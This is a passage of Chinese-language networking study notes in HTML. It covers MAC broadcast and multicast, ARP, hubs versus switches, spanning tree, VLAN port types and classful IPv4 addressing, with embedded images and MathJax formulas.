title="广播MAC地址"><ol><li><p>主机B首先要构建该广播帧，在帧首部中的目的地址字段填入广播地址，也就是十六进制的全F，源地址字段填入自己的MAC地址，再加上帧首部中的其他字段、数据载荷以及帧尾部，就构成了该广播帧。</p></li><li><p>发送该广播帧。</p><img src="/posts/e255a10a/3.8.1.11.png" class="" title="广播MAC地址"></li><li><p>主机A和C都会收到该广播帧，发现该帧首部中的目的地址字段的内容是广播地址，就知道该帧是广播帧，主机A和主机C都接受该帧，并将该帧交给上层处理。</p></li></ol><p><strong>多播MAC地址举例</strong>：</p><p>主机A发送含有多播地址的多播帧，其他主机根据自己的多播组列表，判断是否接收帧。</p><img src="/posts/e255a10a/3.8.1.12.png" class="" title="多播MAC地址"><p>主机A要发送多播帧给该多播地址。将该多播地址的左起第一个字节写成8个比特，第一个字节的最低比特位是1，表明该地址是多播地址。快速判断地址是不是多播地址，就是上图所示箭头所指的第十六进制数不能整除2（1,3,5,7,9,B,D,F），则该地址是多播地址。</p><ol><li><p>构建该多播帧，在帧首部中的目的地址字段填入该多播地址，源地址字段填入自己的MAC地址，再加上帧首部中的其他字段、数据载荷以及帧尾部，就构成了该多播帧。</p></li><li><p>将该多播帧发送出去，主机B、C、D都会收到该多播帧，各用户给自己主机配置多播组列表如图所示：</p><img src="/posts/e255a10a/3.8.1.13.png" class="" title="多播MAC地址"><p>可以看出主机B属于两个多播组，主机C也属于两个多播组，而主机D不属于任何多播组。</p><img src="/posts/e255a10a/3.8.1.14.png" class="" title="多播MAC地址"></li><li><p>主机B和C发现该多播帧的目的MAC地址在自己的多播组列表中，主机B和C都会接受该帧。主机D发现该多播帧的目的MAC地址不在自己得多播组列表中，则丢弃该多播帧。</p></li></ol><h3 id="3-8-2-IP地址"><a href="#3-8-2-IP地址" class="headerlink" title="3.8.2 IP地址"></a>3.8.2 IP地址</h3><img src="/posts/e255a10a/3.8.2.1.png" class="" title="IP地址"><img src="/posts/e255a10a/3.8.2.2.png" class="" title="IP地址与MAC地址"><img src="/posts/e255a10a/3.8.2.3.png" class="" title="IP地址与MAC地址的变化情况"><img src="/posts/e255a10a/3.8.2.4.png" class="" title="IP地址与MAC地址的变化情况"><h3 id="3-8-3-ARP协议"><a href="#3-8-3-ARP协议" class="headerlink" title="3.8.3 ARP协议"></a>3.8.3 ARP协议</h3><p>ARP协议(地址解析协议)可以实现IP地址到MAC地址的相互转换。</p><img src="/posts/e255a10a/3.8.3.2.png" class="" title="ARP地址"><p>在每一个主机中都有一个高速缓存表，可以记录IP地址和MAC地址的对应信息。</p><img src="/posts/e255a10a/3.8.3.3.png" class="" title="ARP高速缓存表"><img src="/posts/e255a10a/3.8.3.4.png" class="" title="ARP请求报文"><img src="/posts/e255a10a/3.8.3.1.png" class="" title="ARP请求报文"><img src="/posts/e255a10a/3.8.3.5.png" class="" title="ARP响应报文"><img src="/posts/e255a10a/3.8.3.6.png" class="" title="主机B保存C的MAC地址"><p>ARP的作用范围：逐段链路或逐个网络使用。</p><p>ARP没有安全验证机制，存在ARP欺骗(攻击)问题。</p><h2 id="3-9-集线器与交换机的区别"><a href="#3-9-集线器与交换机的区别" class="headerlink" title="3.9 集线器与交换机的区别"></a>3.9 集线器与交换机的区别</h2><p>早期的计算机网络中，常用的是总线型以太网。传统以太网最初是使用粗同轴电缆，后来演进到使用比较便宜的细同轴电缆，最后发展为使用更便宜和更灵活的双绞线。但是随着网络的发展被逐渐淘汰，出现了两种新型以太网结构：使用双绞线和集线器(HUB)的星型以太网、使用集线器(HUB)在物理层扩展以太网。</p><h3 id="3-9-1-使用双绞线和集线器HUB的星型以太网"><a href="#3-9-1-使用双绞线和集线器HUB的星型以太网" class="headerlink" title="3.9.1 使用双绞线和集线器HUB的星型以太网"></a>3.9.1 使用双绞线和集线器HUB的星型以太网</h3><p>采用双绞线的以太网采用星型拓扑，在星型的中心则增加了一种可靠性非常高的设备，叫做集线器 (hub)。</p><img src="/posts/e255a10a/3.9.1.1.png" class="" title="使用双绞线和集线器HUB的星型以太网"><p>集线器的以太网在逻辑上仍是个总线网，需要使用CSMA/CD协议来协调各主机争用总线，只能工作在半双工模式，收发帧不能同时进行。</p><h3 id="3-9-2-使用集线器-HUB-在物理层扩展以太网"><a href="#3-9-2-使用集线器-HUB-在物理层扩展以太网" class="headerlink" title="3.9.2 使用集线器(HUB)在物理层扩展以太网"></a>3.9.2 使用集线器(HUB)在物理层扩展以太网</h3><p>使用集线器扩展：将多个以太网段连成更大的、多级星型结构的以太网，会扩大广播域和碰撞域。</p><img src="/posts/e255a10a/3.9.2.1.png" class="" title="使用集线器(HUB)在物理层扩展以太网"><h3 id="3-9-3-以太网交换机"><a href="#3-9-3-以太网交换机" class="headerlink" title="3.9.3 以太网交换机"></a>3.9.3 以太网交换机</h3><p>以太网交换机是在数据链路层扩展以太网。</p><img src="/posts/e255a10a/3.9.3.1.png" class="" title="集线器与交换机"><p>在集线器中，数据是以广播的形式发送，而在交换机中，会发送到目的主机，因此其效率要高很多。</p><img src="/posts/e255a10a/3.9.3.2.png" class="" title="以太网交换机"><h3 id="3-9-4-集线器与交换机的对比"><a href="#3-9-4-集线器与交换机的对比" class="headerlink" title="3.9.4 集线器与交换机的对比"></a>3.9.4 集线器与交换机的对比</h3><img src="/posts/e255a10a/3.9.4.1.png" class="" title="集线器与交换机"><ol><li>在单播情况下，集线器会像总线型一样把信号全部转发出去，而交换机只会发送给目标主机。</li><li>在广播情况下，二者无明显区别。</li></ol><p>当网络中多台主机同时给另一台主机发送单播帧，对于使用集线器的共享总线型以太网，必然会产生碰撞，遭遇碰撞的帧会传播到总线上的各主机；对于使用交换机的交换式以太网，交换机收到多个帧时，将它们缓存起来，然后逐个转发给目的主机，不会产生碰撞。</p><img src="/posts/e255a10a/3.9.4.2.png" class="" title="集线器与交换机"><img src="/posts/e255a10a/3.9.4.3.png" class="" title="集线器与交换机"><img src="/posts/e255a10a/3.9.4.4.png" class="" title="集线器与交换机"><img src="/posts/e255a10a/3.9.4.5.png" class="" title="集线器与交换机"><h2 id="3-10-以太网交换机自学习和转换帧的流程"><a href="#3-10-以太网交换机自学习和转换帧的流程" class="headerlink" title="3.10 以太网交换机自学习和转换帧的流程"></a>3.10 以太网交换机自学习和转换帧的流程</h2><ul><li>以太网交换机工作在数据链路层（也包括物理层）</li><li>在以太网交换机中，有一个帧交换表。其中记录了帧的目的MAC地址对应的接口号。</li><li>以太网交换机是一种即插即用设备，刚上电启动时其内部的帧交换表是空的。随着网络中各主机间的通信，以太网交换机通过自学习算法自动逐渐建立起帧交换表。</li></ul><img src="/posts/e255a10a/3.10.1.png" class="" title="以太网交换机自学习和转换帧"><p>每条记录都有自己的有效时间，到期自动删除。这是因为MAC地址与交换机接口的对应关系并不是永久性的，比如更换主机、更换网卡等导致MAC地址改变。</p><p>PDU(Protocol Data Unit)的意思是协议数据单元，它是计算机网络体系结构中对等实体间逻辑通信的对象。</p><p>以太网交换机工作在数据链路层(也包括物理层)，它接收并转发的PDU通常称为帧。以太网交换机收到帧后，在帧交换表中查找帧的目的MAC地址所对应的接口号，然后通过该接口转发帧。</p><h2 id="3-11-以太网交换机的生成树协议-STP"><a href="#3-11-以太网交换机的生成树协议-STP" class="headerlink" title="3.11 以太网交换机的生成树协议(STP)"></a>3.11 以太网交换机的生成树协议(STP)</h2><p>由于在实际使用过程中，可能会出现线路故障导致无法通信。若A与B之间的线路故障会导致B与A、C之间无法通信。</p><img src="/posts/e255a10a/3.11.2.png" class="" title="链路故障"><img src="/posts/e255a10a/3.11.1.png" class="" title="如何提高以太网的可靠性"><p>以太网交换机使用生成树协议(Spanning Tree Protocol，STP)，可以在增加冗余链路来提高网络可靠性的同时又避免网络环路带来的各种问题。</p><ul><li>不论交换机之间采用怎样的物理连接，交换机都能够自动计算并构建一个逻辑上没有环路的网络，其逻辑拓扑结构必须是树型的(无逻辑环路)；</li><li>最终生成的树型逻辑拓扑要确保连通整个网络；</li><li>当首次连接交换机或网络物理拓扑发生变化时(有可能是人为改变或故障)，交换机都将进行生成树的重新计算。</li></ul><img src="/posts/e255a10a/3.11.3.png" class="" title="生成树协议"><h2 id="3-12-虚拟局域网-VLAN"><a href="#3-12-虚拟局域网-VLAN" class="headerlink" title="3.12 虚拟局域网(VLAN)"></a>3.12 虚拟局域网(VLAN)</h2><img src="/posts/e255a10a/3.12.1.png" class="" title="巨大广播域带来的问题"><p>广播风暴会浪费网络资源和各主机的CPU资源。</p><img src="/posts/e255a10a/3.11.4.png" class="" title="网络中频繁出现广播信息"><img src="/posts/e255a10a/3.12.2.png" class="" title="分割广播域的方法"><p>虚拟局域网VLAN（Virtual Local Area Network）是一种将局域网内的设备划分成与物理位置无关的逻辑组的技术，这些逻辑组具有某些共同的需求。</p><img src="/posts/e255a10a/3.12.3.png" class="" title="划分虚拟局域网"><h3 id="3-12-1-VLAN的实现机制"><a href="#3-12-1-VLAN的实现机制" class="headerlink" title="3.12.1 VLAN的实现机制"></a>3.12.1 VLAN的实现机制</h3><p>虚拟局域网VLAN技术是在交换机上实现的，需要交换机能够实现以下功能：</p><ul><li>能够处理带有VLAN标记的帧——IEEE 802.1Q帧</li><li>交换机的各端口可以支持不同的端口类型，不同端口类型的端口对帧的处理方式有所不同</li></ul><h4 id="3-12-1-1-IEEE-802-1Q帧"><a href="#3-12-1-1-IEEE-802-1Q帧" class="headerlink" title="3.12.1.1 IEEE 802.1Q帧"></a>3.12.1.1 IEEE 802.1Q帧</h4><img src="/posts/e255a10a/3.12.4.png" class="" title="IEEE 802.1Q帧"><h4 id="3-12-1-2-交换机的端口类型"><a href="#3-12-1-2-交换机的端口类型" class="headerlink" title="3.12.1.2 交换机的端口类型"></a>3.12.1.2 交换机的端口类型</h4><ul><li>交换机的端口类型有以下三种：<ul><li>Access</li><li>Trunk</li><li>Hybrid(思科交换机没有此端口)</li></ul></li><li>交换机各端口的缺省VLAN ID<ul><li>在思科交换机上称为 Native VLAN，即本征VLAN。</li><li>在华为交换机上称为 Port VLAN ID，即端口VLAN ID，简记为PVID。</li></ul></li></ul><h5 id="3-12-1-2-1-Access端口"><a href="#3-12-1-2-1-Access端口" class="headerlink" title="3.12.1.2.1 Access端口"></a>3.12.1.2.1 Access端口</h5><p>Access端口主要用于交换机与用户计算机之间的互连。</p><img src="/posts/e255a10a/3.12.5.png" class="" title="Access端口"><p>对于VLAN的实现，可以通过划分VLAN后，修改Access端口的PVID：</p><img src="/posts/e255a10a/3.12.6.png" class="" title="VLAN"><p>从而可以实现广播域的划分。</p><h5 id="3-12-1-2-2-Trunk端口"><a href="#3-12-1-2-2-Trunk端口" class="headerlink" title="3.12.1.2.2 Trunk端口"></a>3.12.1.2.2 Trunk端口</h5><ul><li>Trunk端口一般用于交换机之间或交换机与路由器之间的互连。</li><li>Trunk端口可以属于多个VLAN。</li><li>用户可以设置Trunk端口的PVID值。默认情况下，Trunk端口的PVID值为1。</li><li><p>Trunk端口发送处理方法：</p><ul><li><p>对 VID等于PVID的帧，“去标签” 再转发</p></li><li><p>对 VID不等于PVID的帧，直接转发</p></li></ul></li><li><p>Trunk端口接收处理方法：</p><ul><li>接收 “未打标签” 的帧，根据接收帧的端口的PVID给帧 “打标签”，即插入4字节VLAN标记字段，字段中的VID取值与端口的PVID取值相等</li></ul></li><li>接收 “已打标签” 的帧</li></ul><img src="/posts/e255a10a/3.12.7.png" class="" title="Trunk端口"><img src="/posts/e255a10a/3.12.8.png" class="" title="Trunk端口"><h5 id="3-12-1-2-3-Hybrid端口"><a href="#3-12-1-2-3-Hybrid端口" class="headerlink" title="3.12.1.2.3 Hybrid端口"></a>3.12.1.2.3 Hybrid端口</h5><img src="/posts/e255a10a/3.12.9.png" class="" title="Hybrid端口"><h1 id="4-网络层"><a href="#4-网络层" class="headerlink" title="4. 网络层"></a>4. 网络层</h1><h2 id="4-1-网络层概述"><a href="#4-1-网络层概述" class="headerlink" title="4.1 网络层概述"></a>4.1 网络层概述</h2><ul><li>网络层的主要任务是实现网络互连，进而实现数据包在各网络之间的传输。</li><li>TCP/IP参考模型的网络层提供的是无连接、不可靠的数据报服务。</li><li>要实现网络层任务，需要解决以下主要问题：<ul><li>网络层向运输层提供怎样的服务（“可靠传输” 还是 “不可靠传输”）</li><li>网络层寻址问题</li><li>路由选择问题</li></ul></li></ul><img src="/posts/e255a10a/4.1.1.png" class="" title="互联网"><p>每一个路由器都有一个路由表，路由表中记录了目的网络以及各级跳的路由器端口，以此来选择走哪个路由器到达端口。</p><p>路由记录表的记录有两种情况生成：</p><ol><li>由用户或网络管理员进行人工配置。这种方法只适用于规模较小且网络拓扑不改变的小型互联网。</li><li>实现各种路由选择协议，由路由器执行路由选择协议中所规定的路由选择算法，而自动得出路由表中的路由记录，这种方法更适合规模较大且网络拓扑经常改变的大型互联网。</li></ol><p>因特网是目前全世界用户数量最多的互联网，它使用TCP/IP协议栈。由于TCP/IP协议栈的网络层使用网际协议IP，它是整个协议栈的核心协议，因此在TCP/IP协议栈中网络层常称为网际层。</p><img src="/posts/e255a10a/4.1.2.png" class="" title="TCP/IP协议栈"><h2 id="4-2-网络层提供的两种服务"><a href="#4-2-网络层提供的两种服务" class="headerlink" title="4.2 网络层提供的两种服务"></a>4.2 网络层提供的两种服务</h2><h3 id="4-2-1-面向连接的虚电路服务"><a href="#4-2-1-面向连接的虚电路服务" class="headerlink" title="4.2.1 面向连接的虚电路服务"></a>4.2.1 面向连接的虚电路服务</h3><ul><li>可靠通信由网络来保证</li><li>必须建立网络层的连接——虚电路VC(Virtual Circuit）</li><li>通信双方沿着已建立的虚电路发送分组</li><li>目的主机的地址仅在连接建立阶段使用，之后每个分组的首部只需携带一条虚电路的编号（构成虚电路的每一段链路都有一个虚电路编号）。</li><li>这种通信方式如果再使用可靠传输的网络协议，就可使所发送的分组最终正确到达接收方（无差错按序到达、不丢失、不重复）</li><li>通信结束后，需要释放之前所建立的虚电路。</li><li>很多广域分组交换网都使用面向连接的虚电路服务。例如，曾经的X.25和逐渐过时的帧中继FR、异步传输模式ATM等。</li></ul><img src="/posts/e255a10a/4.2.1.png" class="" title="面向连接的虚电路服务"><h3 id="4-2-2-面向无连接的数据报服务"><a href="#4-2-2-面向无连接的数据报服务" class="headerlink" title="4.2.2 面向无连接的数据报服务"></a>4.2.2 面向无连接的数据报服务</h3><ul><li>可靠通信应当由用户主机来保证</li><li>不需要建立网络层连接</li><li>每个分组可走不同的路径</li><li>每个分组的首部必须携带目的主机的完整地址</li><li>这种通信方式所传送的分组可能误码、丢失、重复和失序。</li><li>由于网络本身不提供端到端的可靠传输服务，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。</li><li>因特网采用了这种设计思想，也就是将复杂的网络处理功能置于因特网的边缘（用户主机和其内部的运输层），而将相对简单的尽最大努力的分组交付功能置于因特网核心。</li></ul><img src="/posts/e255a10a/4.2.2.png" class="" title="面向无连接的数据报服务"><img src="/posts/e255a10a/4.2.3.png" class="" title="两种对比"><h2 id="4-3-IPv4地址"><a href="#4-3-IPv4地址" class="headerlink" title="4.3 IPv4地址"></a>4.3 IPv4地址</h2><h3 id="4-3-1-IPv4地址概述"><a href="#4-3-1-IPv4地址概述" class="headerlink" title="4.3.1 IPv4地址概述"></a>4.3.1 IPv4地址概述</h3><ul><li><p>在TCP/IP体系中，IP地址是一个最基本的概念，我们必须把它弄清楚。</p></li><li><p>IPv4地址就是给因特网（Internet）上的每一台主机（或路由器）的每一个接口分配一个在全世界范围内是唯一的32比特的标识符。</p></li><li><p>IP地址由因特网名字和数字分配机构ICANN(Internet Corporation for Assigned Names and Numbers)进行分配。</p><ul><li>我国用户可向亚太网络信息中心APNIC(Asia Pacific Network Information Center)申请IP地址， 需要缴费。</li><li>2011年2月3日，互联网号码分配管理局IANA（由ICANN行使职能）宣布，IPv4地址已经分配完毕。</li><li>我国在2014至2015年也逐步停止了向新用户和应用分配IPv4地址。同时全面开展商用部署IPv6。</li></ul></li><li><p>IPv4地址的编址方法经历了如下三个历史阶段：</p><img src="/posts/e255a10a/4.3.1.png" class="" title="IPv4三个历史阶段"></li><li><p>32比特的IPv4地址不方便阅读、记录以及输入等，因此IPv4地址采用点分十进制表示方法以方便用户使用。</p><img src="/posts/e255a10a/4.3.2.png" class="" title="IPv4地址表示方法"></li></ul><h3 id="4-3-2-分类编址的IPv4地址"><a href="#4-3-2-分类编址的IPv4地址" class="headerlink" title="4.3.2 分类编址的IPv4地址"></a>4.3.2 分类编址的IPv4地址</h3><p>分类的IPv4地址共分为 5 类：A类地址、B类地址、C类地址、D类地址、E类地址。</p><img src="/posts/e255a10a/4.3.3.png" class="" title="分类编址的IPv4"><h4 id="4-3-2-1-A类地址"><a href="#4-3-2-1-A类地址" class="headerlink" title="4.3.2.1 A类地址"></a>4.3.2.1 A类地址</h4><ul><li>最小网络号 0，保留不指派</li><li>第一个可指派的网络号为 1，网络地址为 1.0.0.0</li><li>最大网络号 127，作为本地环回测试地址，不指派<ul><li>最小的本地环回测试地址为 127.0.0.1</li><li>最大的本地环回测试地址为 127.255.255.254</li></ul></li><li>最后一个可指派的网络号为 126，网络地址为 126.0.0.0</li><li>可指派的网络数量为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="14.471ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6396.2 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2062.5,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3062.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(3840.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4896.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container>（减2的原因是除去最小网络号0和最大网络号127）</li><li>每个网络中可分配的IP地址数量为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="18.883ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 8346.1 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2512.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(3290.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4346.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(2000,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(2500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3000,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(3500,0)"></path></g></g></g></svg></mjx-container>（减2的原因是除去主机号为全 0 的网络地址和全 1 的广播地址）</li></ul><img src="/posts/e255a10a/4.3.4.png" class="" title="A类地址"><h4 id="4-3-2-2-B类地址"><a href="#4-3-2-2-B类地址" class="headerlink" title="4.3.2.2 B类地址"></a>4.3.2.2 B类地址</h4><ul><li>最小网络号也是第一个可指派的网络号 128.0<br>网络地址为 128.0.0.0</li><li>最大网络号也是最后一一个可指派的网络号 191.255<br>网络地址为 191.255.0.0</li><li>可指派的网络数量为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="13.637ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6027.3 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 